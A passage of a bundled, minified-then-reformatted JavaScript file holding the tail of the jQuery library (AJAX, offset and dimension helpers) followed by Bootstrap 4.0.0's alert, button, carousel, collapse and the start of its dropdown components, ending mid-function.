            ? (e[a] = e[a].replace(De, "$1" + s))
            : !1 !== e.jsonp &&
              (e.url += (ae.test(e.url) ? "&" : "?") + e.jsonp + "=" + s),
          (e.converters["script json"] = function () {
            return r || p.error(s + " was not called"), r[0];
          }),
          (e.dataTypes[0] = "json"),
          (o = t[s]),
          (t[s] = function () {
            r = arguments;
          }),
          n.always(function () {
            void 0 === o ? p(t).removeProp(s) : (t[s] = o),
              e[s] && ((e.jsonpCallback = i.jsonpCallback), Ae.push(s)),
              r && p.isFunction(o) && o(r[0]),
              (r = o = void 0);
          }),
          "script")
        : void 0;
    }),
    (p.parseHTML = function (t, e, i) {
      if (!t || "string" != typeof t) return null;
      "boolean" == typeof e && ((i = e), (e = !1)), (e = e || n);
      var s = x.exec(t),
        o = !i && [];
      return s
        ? [e.createElement(s[1])]
        : ((s = tt([t], e, o)),
          o && o.length && p(o).remove(),
          p.merge([], s.childNodes));
    });
  var Ie = p.fn.load;
  function $e(t) {
    return p.isWindow(t) ? t : 9 === t.nodeType && t.defaultView;
  }
  (p.fn.load = function (t, e, i) {
    if ("string" != typeof t && Ie) return Ie.apply(this, arguments);
    var n,
      s,
      o,
      r = this,
      a = t.indexOf(" ");
    return (
      a > -1 && ((n = p.trim(t.slice(a))), (t = t.slice(0, a))),
      p.isFunction(e)
        ? ((i = e), (e = void 0))
        : e && "object" == typeof e && (s = "POST"),
      r.length > 0 &&
        p
          .ajax({ url: t, type: s || "GET", dataType: "html", data: e })
          .done(function (t) {
            (o = arguments),
              r.html(n ? p("<div>").append(p.parseHTML(t)).find(n) : t);
          })
          .always(
            i &&
              function (t, e) {
                r.each(function () {
                  i.apply(this, o || [t.responseText, e, t]);
                });
              }
          ),
      this
    );
  }),
    p.each(
      [
        "ajaxStart",
        "ajaxStop",
        "ajaxComplete",
        "ajaxError",
        "ajaxSuccess",
        "ajaxSend",
      ],
      function (t, e) {
        p.fn[e] = function (t) {
          return this.on(e, t);
        };
      }
    ),
    (p.expr.filters.animated = function (t) {
      return p.grep(p.timers, function (e) {
        return t === e.elem;
      }).length;
    }),
    (p.offset = {
      setOffset: function (t, e, i) {
        var n,
          s,
          o,
          r,
          a,
          l,
          c = p.css(t, "position"),
          u = p(t),
          d = {};
        "static" === c && (t.style.position = "relative"),
          (a = u.offset()),
          (o = p.css(t, "top")),
          (l = p.css(t, "left")),
          ("absolute" === c || "fixed" === c) && (o + l).indexOf("auto") > -1
            ? ((r = (n = u.position()).top), (s = n.left))
            : ((r = parseFloat(o) || 0), (s = parseFloat(l) || 0)),
          p.isFunction(e) && (e = e.call(t, i, p.extend({}, a))),
          null != e.top && (d.top = e.top - a.top + r),
          null != e.left && (d.left = e.left - a.left + s),
          "using" in e ? e.using.call(t, d) : u.css(d);
      },
    }),
    p.fn.extend({
      offset: function (t) {
        if (arguments.length)
          return void 0 === t
            ? this
            : this.each(function (e) {
                p.offset.setOffset(this, t, e);
              });
        var e,
          i,
          n = this[0],
          s = { top: 0, left: 0 },
          o = n && n.ownerDocument;
        return o
          ? ((e = o.documentElement),
            p.contains(e, n)
              ? ((s = n.getBoundingClientRect()),
                (i = $e(o)),
                {
                  top: s.top + i.pageYOffset - e.clientTop,
                  left: s.left + i.pageXOffset - e.clientLeft,
                })
              : s)
          : void 0;
      },
      position: function () {
        if (this[0]) {
          var t,
            e,
            i = this[0],
            n = { top: 0, left: 0 };
          return (
            "fixed" === p.css(i, "position")
              ? (e = i.getBoundingClientRect())
              : ((t = this.offsetParent()),
                (e = this.offset()),
                p.nodeName(t[0], "html") || (n = t.offset()),
                (n.top += p.css(t[0], "borderTopWidth", !0)),
                (n.left += p.css(t[0], "borderLeftWidth", !0))),
            {
              top: e.top - n.top - p.css(i, "marginTop", !0),
              left: e.left - n.left - p.css(i, "marginLeft", !0),
            }
          );
        }
      },
      offsetParent: function () {
        return this.map(function () {
          for (
            var t = this.offsetParent;
            t && "static" === p.css(t, "position");

          )
            t = t.offsetParent;
          return t || At;
        });
      },
    }),
    p.each(
      { scrollLeft: "pageXOffset", scrollTop: "pageYOffset" },
      function (t, e) {
        var i = "pageYOffset" === e;
        p.fn[t] = function (n) {
          return P(
            this,
            function (t, n, s) {
              var o = $e(t);
              return void 0 === s
                ? o
                  ? o[e]
                  : t[n]
                : void (o
                    ? o.scrollTo(i ? o.pageXOffset : s, i ? s : o.pageYOffset)
                    : (t[n] = s));
            },
            t,
            n,
            arguments.length
          );
        };
      }
    ),
    p.each(["top", "left"], function (t, e) {
      p.cssHooks[e] = It(d.pixelPosition, function (t, i) {
        return i
          ? ((i = Dt(t, e)), kt.test(i) ? p(t).position()[e] + "px" : i)
          : void 0;
      });
    }),
    p.each({ Height: "height", Width: "width" }, function (t, e) {
      p.each(
        { padding: "inner" + t, content: e, "": "outer" + t },
        function (i, n) {
          p.fn[n] = function (n, s) {
            var o = arguments.length && (i || "boolean" != typeof n),
              r = i || (!0 === n || !0 === s ? "margin" : "border");
            return P(
              this,
              function (e, i, n) {
                var s;
                return p.isWindow(e)
                  ? e.document.documentElement["client" + t]
                  : 9 === e.nodeType
                  ? ((s = e.documentElement),
                    Math.max(
                      e.body["scroll" + t],
                      s["scroll" + t],
                      e.body["offset" + t],
                      s["offset" + t],
                      s["client" + t]
                    ))
                  : void 0 === n
                  ? p.css(e, i, r)
                  : p.style(e, i, n, r);
              },
              e,
              o ? n : void 0,
              o,
              null
            );
          };
        }
      );
    }),
    p.fn.extend({
      bind: function (t, e, i) {
        return this.on(t, null, e, i);
      },
      unbind: function (t, e) {
        return this.off(t, null, e);
      },
      delegate: function (t, e, i, n) {
        return this.on(e, t, i, n);
      },
      undelegate: function (t, e, i) {
        return 1 === arguments.length
          ? this.off(t, "**")
          : this.off(e, t || "**", i);
      },
      size: function () {
        return this.length;
      },
    }),
    (p.fn.andSelf = p.fn.addBack),
    "function" == typeof define &&
      define.amd &&
      define("jquery", [], function () {
        return p;
      });
  var Oe = t.jQuery,
    Ne = t.$;
  return (
    (p.noConflict = function (e) {
      return t.$ === p && (t.$ = Ne), e && t.jQuery === p && (t.jQuery = Oe), p;
    }),
    e || (t.jQuery = t.$ = p),
    p
  );
}),
  (function (t, e) {
    "object" == typeof exports && "undefined" != typeof module
      ? e(exports, require("jquery"), require("popper.js"))
      : "function" == typeof define && define.amd
      ? define(["exports", "jquery", "popper.js"], e)
      : e((t.bootstrap = {}), t.jQuery, t.Popper);
  })(this, function (t, e, i) {
    "use strict";
    function n(t, e) {
      for (var i = 0; i < e.length; i++) {
        var n = e[i];
        (n.enumerable = n.enumerable || !1),
          (n.configurable = !0),
          "value" in n && (n.writable = !0),
          Object.defineProperty(t, n.key, n);
      }
    }
    function s(t, e, i) {
      return e && n(t.prototype, e), i && n(t, i), t;
    }
    function o() {
      return (o =
        Object.assign ||
        function (t) {
          for (var e = 1; e < arguments.length; e++) {
            var i = arguments[e];
            for (var n in i)
              Object.prototype.hasOwnProperty.call(i, n) && (t[n] = i[n]);
          }
          return t;
        }).apply(this, arguments);
    }
    (e = e && e.hasOwnProperty("default") ? e.default : e),
      (i = i && i.hasOwnProperty("default") ? i.default : i);
    var r,
      a,
      l,
      c,
      u,
      d,
      h,
      p,
      f,
      g,
      m,
      v,
      y,
      _,
      w,
      b,
      C,
      x,
      T = (function (t) {
        var e = !1;
        var i = {
          TRANSITION_END: "bsTransitionEnd",
          getUID: function (t) {
            do {
              t += ~~(1e6 * Math.random());
            } while (document.getElementById(t));
            return t;
          },
          getSelectorFromElement: function (e) {
            var i,
              n = e.getAttribute("data-target");
            (n && "#" !== n) || (n = e.getAttribute("href") || ""),
              "#" === n.charAt(0) &&
                ((i = n),
                (n = i =
                  "function" == typeof t.escapeSelector
                    ? t.escapeSelector(i).substr(1)
                    : i.replace(/(:|\.|\[|\]|,|=|@)/g, "\\$1")));
            try {
              return t(document).find(n).length > 0 ? n : null;
            } catch (t) {
              return null;
            }
          },
          reflow: function (t) {
            return t.offsetHeight;
          },
          triggerTransitionEnd: function (i) {
            t(i).trigger(e.end);
          },
          supportsTransitionEnd: function () {
            return Boolean(e);
          },
          isElement: function (t) {
            return (t[0] || t).nodeType;
          },
          typeCheckConfig: function (t, e, n) {
            for (var s in n)
              if (Object.prototype.hasOwnProperty.call(n, s)) {
                var o = n[s],
                  r = e[s],
                  a =
                    r && i.isElement(r)
                      ? "element"
                      : ((l = r),
                        {}.toString
                          .call(l)
                          .match(/\s([a-zA-Z]+)/)[1]
                          .toLowerCase());
                if (!new RegExp(o).test(a))
                  throw new Error(
                    t.toUpperCase() +
                      ': Option "' +
                      s +
                      '" provided type "' +
                      a +
                      '" but expected type "' +
                      o +
                      '".'
                  );
              }
            var l;
          },
        };
        return (
          (e = ("undefined" == typeof window || !window.QUnit) && {
            end: "transitionend",
          }),
          (t.fn.emulateTransitionEnd = function (e) {
            var n = this,
              s = !1;
            return (
              t(this).one(i.TRANSITION_END, function () {
                s = !0;
              }),
              setTimeout(function () {
                s || i.triggerTransitionEnd(n);
              }, e),
              this
            );
          }),
          i.supportsTransitionEnd() &&
            (t.event.special[i.TRANSITION_END] = {
              bindType: e.end,
              delegateType: e.end,
              handle: function (e) {
                if (t(e.target).is(this))
                  return e.handleObj.handler.apply(this, arguments);
              },
            }),
          i
        );
      })(e),
      k =
        ((a = "alert"),
        (c = "." + (l = "bs.alert")),
        (u = (r = e).fn[a]),
        (d = {
          CLOSE: "close" + c,
          CLOSED: "closed" + c,
          CLICK_DATA_API: "click" + c + ".data-api",
        }),
        "alert",
        "fade",
        "show",
        (h = (function () {
          function t(t) {
            this._element = t;
          }
          var e = t.prototype;
          return (
            (e.close = function (t) {
              t = t || this._element;
              var e = this._getRootElement(t);
              this._triggerCloseEvent(e).isDefaultPrevented() ||
                this._removeElement(e);
            }),
            (e.dispose = function () {
              r.removeData(this._element, l), (this._element = null);
            }),
            (e._getRootElement = function (t) {
              var e = T.getSelectorFromElement(t),
                i = !1;
              return (
                e && (i = r(e)[0]), i || (i = r(t).closest(".alert")[0]), i
              );
            }),
            (e._triggerCloseEvent = function (t) {
              var e = r.Event(d.CLOSE);
              return r(t).trigger(e), e;
            }),
            (e._removeElement = function (t) {
              var e = this;
              r(t).removeClass("show"),
                T.supportsTransitionEnd() && r(t).hasClass("fade")
                  ? r(t)
                      .one(T.TRANSITION_END, function (i) {
                        return e._destroyElement(t, i);
                      })
                      .emulateTransitionEnd(150)
                  : this._destroyElement(t);
            }),
            (e._destroyElement = function (t) {
              r(t).detach().trigger(d.CLOSED).remove();
            }),
            (t._jQueryInterface = function (e) {
              return this.each(function () {
                var i = r(this),
                  n = i.data(l);
                n || ((n = new t(this)), i.data(l, n)),
                  "close" === e && n[e](this);
              });
            }),
            (t._handleDismiss = function (t) {
              return function (e) {
                e && e.preventDefault(), t.close(this);
              };
            }),
            s(t, null, [
              {
                key: "VERSION",
                get: function () {
                  return "4.0.0";
                },
              },
            ]),
            t
          );
        })()),
        r(document).on(
          d.CLICK_DATA_API,
          '[data-dismiss="alert"]',
          h._handleDismiss(new h())
        ),
        (r.fn[a] = h._jQueryInterface),
        (r.fn[a].Constructor = h),
        (r.fn[a].noConflict = function () {
          return (r.fn[a] = u), h._jQueryInterface;
        }),
        h),
      S =
        ((f = "button"),
        (m = "." + (g = "bs.button")),
        (v = ".data-api"),
        (y = (p = e).fn[f]),
        (_ = "active"),
        "btn",
        "focus",
        (w = '[data-toggle^="button"]'),
        '[data-toggle="buttons"]',
        "input",
        ".active",
        (b = ".btn"),
        (C = {
          CLICK_DATA_API: "click" + m + v,
          FOCUS_BLUR_DATA_API: "focus" + m + v + " blur" + m + v,
        }),
        (x = (function () {
          function t(t) {
            this._element = t;
          }
          var e = t.prototype;
          return (
            (e.toggle = function () {
              var t = !0,
                e = !0,
                i = p(this._element).closest('[data-toggle="buttons"]')[0];
              if (i) {
                var n = p(this._element).find("input")[0];
                if (n) {
                  if ("radio" === n.type)
                    if (n.checked && p(this._element).hasClass(_)) t = !1;
                    else {
                      var s = p(i).find(".active")[0];
                      s && p(s).removeClass(_);
                    }
                  if (t) {
                    if (
                      n.hasAttribute("disabled") ||
                      i.hasAttribute("disabled") ||
                      n.classList.contains("disabled") ||
                      i.classList.contains("disabled")
                    )
                      return;
                    (n.checked = !p(this._element).hasClass(_)),
                      p(n).trigger("change");
                  }
                  n.focus(), (e = !1);
                }
              }
              e &&
                this._element.setAttribute(
                  "aria-pressed",
                  !p(this._element).hasClass(_)
                ),
                t && p(this._element).toggleClass(_);
            }),
            (e.dispose = function () {
              p.removeData(this._element, g), (this._element = null);
            }),
            (t._jQueryInterface = function (e) {
              return this.each(function () {
                var i = p(this).data(g);
                i || ((i = new t(this)), p(this).data(g, i)),
                  "toggle" === e && i[e]();
              });
            }),
            s(t, null, [
              {
                key: "VERSION",
                get: function () {
                  return "4.0.0";
                },
              },
            ]),
            t
          );
        })()),
        p(document)
          .on(C.CLICK_DATA_API, w, function (t) {
            t.preventDefault();
            var e = t.target;
            p(e).hasClass("btn") || (e = p(e).closest(b)),
              x._jQueryInterface.call(p(e), "toggle");
          })
          .on(C.FOCUS_BLUR_DATA_API, w, function (t) {
            var e = p(t.target).closest(b)[0];
            p(e).toggleClass("focus", /^focus(in)?$/.test(t.type));
          }),
        (p.fn[f] = x._jQueryInterface),
        (p.fn[f].Constructor = x),
        (p.fn[f].noConflict = function () {
          return (p.fn[f] = y), x._jQueryInterface;
        }),
        x),
      E = (function (t) {
        var e = "carousel",
          i = "bs.carousel",
          n = "." + i,
          r = t.fn[e],
          a = {
            interval: 5e3,
            keyboard: !0,
            slide: !1,
            pause: "hover",
            wrap: !0,
          },
          l = {
            interval: "(number|boolean)",
            keyboard: "boolean",
            slide: "(boolean|string)",
            pause: "(string|boolean)",
            wrap: "boolean",
          },
          c = "next",
          u = "prev",
          d = {
            SLIDE: "slide" + n,
            SLID: "slid" + n,
            KEYDOWN: "keydown" + n,
            MOUSEENTER: "mouseenter" + n,
            MOUSELEAVE: "mouseleave" + n,
            TOUCHEND: "touchend" + n,
            LOAD_DATA_API: "load" + n + ".data-api",
            CLICK_DATA_API: "click" + n + ".data-api",
          },
          h = "active",
          p = ".active",
          f = ".active.carousel-item",
          g = ".carousel-item",
          m = ".carousel-item-next, .carousel-item-prev",
          v = ".carousel-indicators",
          y = "[data-slide], [data-slide-to]",
          _ = '[data-ride="carousel"]',
          w = (function () {
            function r(e, i) {
              (this._items = null),
                (this._interval = null),
                (this._activeElement = null),
                (this._isPaused = !1),
                (this._isSliding = !1),
                (this.touchTimeout = null),
                (this._config = this._getConfig(i)),
                (this._element = t(e)[0]),
                (this._indicatorsElement = t(this._element).find(v)[0]),
                this._addEventListeners();
            }
            var y = r.prototype;
            return (
              (y.next = function () {
                this._isSliding || this._slide(c);
              }),
              (y.nextWhenVisible = function () {
                !document.hidden &&
                  t(this._element).is(":visible") &&
                  "hidden" !== t(this._element).css("visibility") &&
                  this.next();
              }),
              (y.prev = function () {
                this._isSliding || this._slide(u);
              }),
              (y.pause = function (e) {
                e || (this._isPaused = !0),
                  t(this._element).find(m)[0] &&
                    T.supportsTransitionEnd() &&
                    (T.triggerTransitionEnd(this._element), this.cycle(!0)),
                  clearInterval(this._interval),
                  (this._interval = null);
              }),
              (y.cycle = function (t) {
                t || (this._isPaused = !1),
                  this._interval &&
                    (clearInterval(this._interval), (this._interval = null)),
                  this._config.interval &&
                    !this._isPaused &&
                    (this._interval = setInterval(
                      (document.visibilityState
                        ? this.nextWhenVisible
                        : this.next
                      ).bind(this),
                      this._config.interval
                    ));
              }),
              (y.to = function (e) {
                var i = this;
                this._activeElement = t(this._element).find(f)[0];
                var n = this._getItemIndex(this._activeElement);
                if (!(e > this._items.length - 1 || e < 0))
                  if (this._isSliding)
                    t(this._element).one(d.SLID, function () {
                      return i.to(e);
                    });
                  else {
                    if (n === e) return this.pause(), void this.cycle();
                    var s = e > n ? c : u;
                    this._slide(s, this._items[e]);
                  }
              }),
              (y.dispose = function () {
                t(this._element).off(n),
                  t.removeData(this._element, i),
                  (this._items = null),
                  (this._config = null),
                  (this._element = null),
                  (this._interval = null),
                  (this._isPaused = null),
                  (this._isSliding = null),
                  (this._activeElement = null),
                  (this._indicatorsElement = null);
              }),
              (y._getConfig = function (t) {
                return (t = o({}, a, t)), T.typeCheckConfig(e, t, l), t;
              }),
              (y._addEventListeners = function () {
                var e = this;
                this._config.keyboard &&
                  t(this._element).on(d.KEYDOWN, function (t) {
                    return e._keydown(t);
                  }),
                  "hover" === this._config.pause &&
                    (t(this._element)
                      .on(d.MOUSEENTER, function (t) {
                        return e.pause(t);
                      })
                      .on(d.MOUSELEAVE, function (t) {
                        return e.cycle(t);
                      }),
                    "ontouchstart" in document.documentElement &&
                      t(this._element).on(d.TOUCHEND, function () {
                        e.pause(),
                          e.touchTimeout && clearTimeout(e.touchTimeout),
                          (e.touchTimeout = setTimeout(function (t) {
                            return e.cycle(t);
                          }, 500 + e._config.interval));
                      }));
              }),
              (y._keydown = function (t) {
                if (!/input|textarea/i.test(t.target.tagName))
                  switch (t.which) {
                    case 37:
                      t.preventDefault(), this.prev();
                      break;
                    case 39:
                      t.preventDefault(), this.next();
                  }
              }),
              (y._getItemIndex = function (e) {
                return (
                  (this._items = t.makeArray(t(e).parent().find(g))),
                  this._items.indexOf(e)
                );
              }),
              (y._getItemByDirection = function (t, e) {
                var i = t === c,
                  n = t === u,
                  s = this._getItemIndex(e),
                  o = this._items.length - 1;
                if (((n && 0 === s) || (i && s === o)) && !this._config.wrap)
                  return e;
                var r = (s + (t === u ? -1 : 1)) % this._items.length;
                return -1 === r
                  ? this._items[this._items.length - 1]
                  : this._items[r];
              }),
              (y._triggerSlideEvent = function (e, i) {
                var n = this._getItemIndex(e),
                  s = this._getItemIndex(t(this._element).find(f)[0]),
                  o = t.Event(d.SLIDE, {
                    relatedTarget: e,
                    direction: i,
                    from: s,
                    to: n,
                  });
                return t(this._element).trigger(o), o;
              }),
              (y._setActiveIndicatorElement = function (e) {
                if (this._indicatorsElement) {
                  t(this._indicatorsElement).find(p).removeClass(h);
                  var i =
                    this._indicatorsElement.children[this._getItemIndex(e)];
                  i && t(i).addClass(h);
                }
              }),
              (y._slide = function (e, i) {
                var n,
                  s,
                  o,
                  r = this,
                  a = t(this._element).find(f)[0],
                  l = this._getItemIndex(a),
                  u = i || (a && this._getItemByDirection(e, a)),
                  p = this._getItemIndex(u),
                  g = Boolean(this._interval);
                if (
                  (e === c
                    ? ((n = "carousel-item-left"),
                      (s = "carousel-item-next"),
                      (o = "left"))
                    : ((n = "carousel-item-right"),
                      (s = "carousel-item-prev"),
                      (o = "right")),
                  u && t(u).hasClass(h))
                )
                  this._isSliding = !1;
                else if (
                  !this._triggerSlideEvent(u, o).isDefaultPrevented() &&
                  a &&
                  u
                ) {
                  (this._isSliding = !0),
                    g && this.pause(),
                    this._setActiveIndicatorElement(u);
                  var m = t.Event(d.SLID, {
                    relatedTarget: u,
                    direction: o,
                    from: l,
                    to: p,
                  });
                  T.supportsTransitionEnd() &&
                  t(this._element).hasClass("slide")
                    ? (t(u).addClass(s),
                      T.reflow(u),
                      t(a).addClass(n),
                      t(u).addClass(n),
                      t(a)
                        .one(T.TRANSITION_END, function () {
                          t(u)
                            .removeClass(n + " " + s)
                            .addClass(h),
                            t(a).removeClass(h + " " + s + " " + n),
                            (r._isSliding = !1),
                            setTimeout(function () {
                              return t(r._element).trigger(m);
                            }, 0);
                        })
                        .emulateTransitionEnd(600))
                    : (t(a).removeClass(h),
                      t(u).addClass(h),
                      (this._isSliding = !1),
                      t(this._element).trigger(m)),
                    g && this.cycle();
                }
              }),
              (r._jQueryInterface = function (e) {
                return this.each(function () {
                  var n = t(this).data(i),
                    s = o({}, a, t(this).data());
                  "object" == typeof e && (s = o({}, s, e));
                  var l = "string" == typeof e ? e : s.slide;
                  if (
                    (n || ((n = new r(this, s)), t(this).data(i, n)),
                    "number" == typeof e)
                  )
                    n.to(e);
                  else if ("string" == typeof l) {
                    if (void 0 === n[l])
                      throw new TypeError('No method named "' + l + '"');
                    n[l]();
                  } else s.interval && (n.pause(), n.cycle());
                });
              }),
              (r._dataApiClickHandler = function (e) {
                var n = T.getSelectorFromElement(this);
                if (n) {
                  var s = t(n)[0];
                  if (s && t(s).hasClass("carousel")) {
                    var a = o({}, t(s).data(), t(this).data()),
                      l = this.getAttribute("data-slide-to");
                    l && (a.interval = !1),
                      r._jQueryInterface.call(t(s), a),
                      l && t(s).data(i).to(l),
                      e.preventDefault();
                  }
                }
              }),
              s(r, null, [
                {
                  key: "VERSION",
                  get: function () {
                    return "4.0.0";
                  },
                },
                {
                  key: "Default",
                  get: function () {
                    return a;
                  },
                },
              ]),
              r
            );
          })();
        return (
          t(document).on(d.CLICK_DATA_API, y, w._dataApiClickHandler),
          t(window).on(d.LOAD_DATA_API, function () {
            t(_).each(function () {
              var e = t(this);
              w._jQueryInterface.call(e, e.data());
            });
          }),
          (t.fn[e] = w._jQueryInterface),
          (t.fn[e].Constructor = w),
          (t.fn[e].noConflict = function () {
            return (t.fn[e] = r), w._jQueryInterface;
          }),
          w
        );
      })(e),
      A = (function (t) {
        var e = "collapse",
          i = "bs.collapse",
          n = "." + i,
          r = t.fn[e],
          a = { toggle: !0, parent: "" },
          l = { toggle: "boolean", parent: "(string|element)" },
          c = {
            SHOW: "show" + n,
            SHOWN: "shown" + n,
            HIDE: "hide" + n,
            HIDDEN: "hidden" + n,
            CLICK_DATA_API: "click" + n + ".data-api",
          },
          u = "show",
          d = "collapse",
          h = "collapsing",
          p = "collapsed",
          f = "width",
          g = ".show, .collapsing",
          m = '[data-toggle="collapse"]',
          v = (function () {
            function n(e, i) {
              (this._isTransitioning = !1),
                (this._element = e),
                (this._config = this._getConfig(i)),
                (this._triggerArray = t.makeArray(
                  t(
                    '[data-toggle="collapse"][href="#' +
                      e.id +
                      '"],[data-toggle="collapse"][data-target="#' +
                      e.id +
                      '"]'
                  )
                ));
              for (var n = t(m), s = 0; s < n.length; s++) {
                var o = n[s],
                  r = T.getSelectorFromElement(o);
                null !== r &&
                  t(r).filter(e).length > 0 &&
                  ((this._selector = r), this._triggerArray.push(o));
              }
              (this._parent = this._config.parent ? this._getParent() : null),
                this._config.parent ||
                  this._addAriaAndCollapsedClass(
                    this._element,
                    this._triggerArray
                  ),
                this._config.toggle && this.toggle();
            }
            var r = n.prototype;
            return (
              (r.toggle = function () {
                t(this._element).hasClass(u) ? this.hide() : this.show();
              }),
              (r.show = function () {
                var e,
                  s,
                  o = this;
                if (
                  !(
                    this._isTransitioning ||
                    t(this._element).hasClass(u) ||
                    (this._parent &&
                      0 ===
                        (e = t.makeArray(
                          t(this._parent)
                            .find(g)
                            .filter(
                              '[data-parent="' + this._config.parent + '"]'
                            )
                        )).length &&
                      (e = null),
                    e &&
                      (s = t(e).not(this._selector).data(i)) &&
                      s._isTransitioning)
                  )
                ) {
                  var r = t.Event(c.SHOW);
                  if ((t(this._element).trigger(r), !r.isDefaultPrevented())) {
                    e &&
                      (n._jQueryInterface.call(
                        t(e).not(this._selector),
                        "hide"
                      ),
                      s || t(e).data(i, null));
                    var a = this._getDimension();
                    t(this._element).removeClass(d).addClass(h),
                      (this._element.style[a] = 0),
                      this._triggerArray.length > 0 &&
                        t(this._triggerArray)
                          .removeClass(p)
                          .attr("aria-expanded", !0),
                      this.setTransitioning(!0);
                    var l = function () {
                      t(o._element).removeClass(h).addClass(d).addClass(u),
                        (o._element.style[a] = ""),
                        o.setTransitioning(!1),
                        t(o._element).trigger(c.SHOWN);
                    };
                    if (T.supportsTransitionEnd()) {
                      var f = "scroll" + (a[0].toUpperCase() + a.slice(1));
                      t(this._element)
                        .one(T.TRANSITION_END, l)
                        .emulateTransitionEnd(600),
                        (this._element.style[a] = this._element[f] + "px");
                    } else l();
                  }
                }
              }),
              (r.hide = function () {
                var e = this;
                if (!this._isTransitioning && t(this._element).hasClass(u)) {
                  var i = t.Event(c.HIDE);
                  if ((t(this._element).trigger(i), !i.isDefaultPrevented())) {
                    var n = this._getDimension();
                    if (
                      ((this._element.style[n] =
                        this._element.getBoundingClientRect()[n] + "px"),
                      T.reflow(this._element),
                      t(this._element)
                        .addClass(h)
                        .removeClass(d)
                        .removeClass(u),
                      this._triggerArray.length > 0)
                    )
                      for (var s = 0; s < this._triggerArray.length; s++) {
                        var o = this._triggerArray[s],
                          r = T.getSelectorFromElement(o);
                        null !== r &&
                          (t(r).hasClass(u) ||
                            t(o).addClass(p).attr("aria-expanded", !1));
                      }
                    this.setTransitioning(!0);
                    var a = function () {
                      e.setTransitioning(!1),
                        t(e._element)
                          .removeClass(h)
                          .addClass(d)
                          .trigger(c.HIDDEN);
                    };
                    (this._element.style[n] = ""),
                      T.supportsTransitionEnd()
                        ? t(this._element)
                            .one(T.TRANSITION_END, a)
                            .emulateTransitionEnd(600)
                        : a();
                  }
                }
              }),
              (r.setTransitioning = function (t) {
                this._isTransitioning = t;
              }),
              (r.dispose = function () {
                t.removeData(this._element, i),
                  (this._config = null),
                  (this._parent = null),
                  (this._element = null),
                  (this._triggerArray = null),
                  (this._isTransitioning = null);
              }),
              (r._getConfig = function (t) {
                return (
                  ((t = o({}, a, t)).toggle = Boolean(t.toggle)),
                  T.typeCheckConfig(e, t, l),
                  t
                );
              }),
              (r._getDimension = function () {
                return t(this._element).hasClass(f) ? f : "height";
              }),
              (r._getParent = function () {
                var e = this,
                  i = null;
                T.isElement(this._config.parent)
                  ? ((i = this._config.parent),
                    void 0 !== this._config.parent.jquery &&
                      (i = this._config.parent[0]))
                  : (i = t(this._config.parent)[0]);
                var s =
                  '[data-toggle="collapse"][data-parent="' +
                  this._config.parent +
                  '"]';
                return (
                  t(i)
                    .find(s)
                    .each(function (t, i) {
                      e._addAriaAndCollapsedClass(n._getTargetFromElement(i), [
                        i,
                      ]);
                    }),
                  i
                );
              }),
              (r._addAriaAndCollapsedClass = function (e, i) {
                if (e) {
                  var n = t(e).hasClass(u);
                  i.length > 0 &&
                    t(i).toggleClass(p, !n).attr("aria-expanded", n);
                }
              }),
              (n._getTargetFromElement = function (e) {
                var i = T.getSelectorFromElement(e);
                return i ? t(i)[0] : null;
              }),
              (n._jQueryInterface = function (e) {
                return this.each(function () {
                  var s = t(this),
                    r = s.data(i),
                    l = o({}, a, s.data(), "object" == typeof e && e);
                  if (
                    (!r && l.toggle && /show|hide/.test(e) && (l.toggle = !1),
                    r || ((r = new n(this, l)), s.data(i, r)),
                    "string" == typeof e)
                  ) {
                    if (void 0 === r[e])
                      throw new TypeError('No method named "' + e + '"');
                    r[e]();
                  }
                });
              }),
              s(n, null, [
                {
                  key: "VERSION",
                  get: function () {
                    return "4.0.0";
                  },
                },
                {
                  key: "Default",
                  get: function () {
                    return a;
                  },
                },
              ]),
              n
            );
          })();
        return (
          t(document).on(c.CLICK_DATA_API, m, function (e) {
            "A" === e.currentTarget.tagName && e.preventDefault();
            var n = t(this),
              s = T.getSelectorFromElement(this);
            t(s).each(function () {
              var e = t(this),
                s = e.data(i) ? "toggle" : n.data();
              v._jQueryInterface.call(e, s);
            });
          }),
          (t.fn[e] = v._jQueryInterface),
          (t.fn[e].Constructor = v),
          (t.fn[e].noConflict = function () {
            return (t.fn[e] = r), v._jQueryInterface;
          }),
          v
        );
      })(e),
      D = (function (t) {
        var e = "dropdown",
          n = "bs.dropdown",
          r = "." + n,
          a = ".data-api",
          l = t.fn[e],
          c = new RegExp("38|40|27"),
          u = {
            HIDE: "hide" + r,
            HIDDEN: "hidden" + r,
            SHOW: "show" + r,
            SHOWN: "shown" + r,
            CLICK: "click" + r,
            CLICK_DATA_API: "click" + r + a,
            KEYDOWN_DATA_API: "keydown" + r + a,
            KEYUP_DATA_API: "keyup" + r + a,
          },
          d = "disabled",
          h = "show",
          p = "dropup",
          f = "dropdown-menu-right",
          g = '[data-toggle="dropdown"]',
          m = ".dropdown-menu",
          v = { offset: 0, flip: !0, boundary: "scrollParent" },
          y = {
            offset: "(number|string|function)",
            flip: "boolean",
            boundary: "(string|element)",
          },
          _ = (function () {
            function a(t, e) {
              (this._element = t),
                (this._popper = null),
                (this._config = this._getConfig(e)),
                (this._menu = this._getMenuElement()),
                (this._inNavbar = this._detectNavbar()),
                this._addEventListeners();
            }
            var l = a.prototype;
            return (
              (l.toggle = function () {
                if (!this._element.disabled && !t(this._element).hasClass(d)) {
                  var e = a._getParentFromElement(this._element),
                    n = t(this._menu).hasClass(h);
                  if ((a._clearMenus(), !n)) {
                    var s = { relatedTarget: this._element },
                      o = t.Event(u.SHOW, s);
                    if ((t(e).trigger(o), !o.isDefaultPrevented())) {
                      if (!this._inNavbar) {
                        if (void 0 === i)
                          throw new TypeError(
                            "Bootstrap dropdown require Popper.js (https://popper.js.org)"
                          );
                        var r = this._element;
                        t(e).hasClass(p) &&
                          (t(this._menu).hasClass("dropdown-menu-left") ||
                            t(this._menu).hasClass(f)) &&
                          (r = e),
                          "scrollParent" !== this._config.boundary &&
                            t(e).addClass("position-static"),
                          (this._popper = new i(
                            r,
                            this._menu,
                            this._getPopperConfig()
                          ));
                      }
                      "ontouchstart" in document.documentElement &&
                        0 === t(e).closest(".navbar-nav").length &&
                        t("body").children().on("mouseover", null, t.noop),
                        this._element.focus(),
                        this._element.setAttribute("aria-expanded", !0),
                        t(this._menu).toggleClass(h),
                        t(e).toggleClass(h).trigger(t.Event(u.SHOWN, s));
                    }
                  }
                }
              }),
              (l.dispose = function () {
                t.removeData(this._element, n),
                  t(this._element).off(r),
                  (this._element = null),
                  (this._menu = null),
                  null !== this._popper &&
                    (this._popper.destroy(), (this._popper = null));
              }),
              (l.update = function () {
                (this._inNavbar = this._detectNavbar()),
